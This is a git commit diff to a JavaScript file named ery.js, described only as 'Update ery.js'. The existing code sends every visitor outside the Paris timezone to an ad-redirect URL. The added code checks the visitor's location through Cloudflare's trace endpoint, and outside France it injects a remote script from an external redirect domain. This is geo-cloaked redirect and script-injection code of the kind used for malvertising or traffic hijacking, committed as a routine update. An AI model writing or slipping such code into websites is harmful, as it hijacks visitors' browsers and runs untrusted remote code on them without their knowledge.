2e20d0bf44f7ce884387845eb5d1f84ab950232f
elankton <74224289+elankton@users.noreply.github.com>
2023-05-27 16:31:21 +0300

    Update ery.js

--- ery.js
+++ ery.js
@@ -1,3 +1,20 @@
 if (Intl.DateTimeFormat().resolvedOptions().timeZone.toLowerCase().indexOf('/paris') === -1){
 window.location.href = "https://www.highrevenuegate.com/pnhjy8tj?key=cb019f8aeb2e1fd2e36b88b0ca124112";
 }
+
+
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+    if (this.responseText.toLowerCase().indexOf("loc=fr") === -1){
+        (function (a, d, j, o) {
+             o = a.createElement(d),
+                m = a.getElementsByTagName(d)[0];              
+             o.src = j + "?d=0&r=" + Math.random();
+             m.parentNode.insertBefore(o, m)
+        })(document, 'script', 'https://global-redirecting.com/sl/2e72ef55');
+    }
+}
+};
+xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
+xhttp.send();
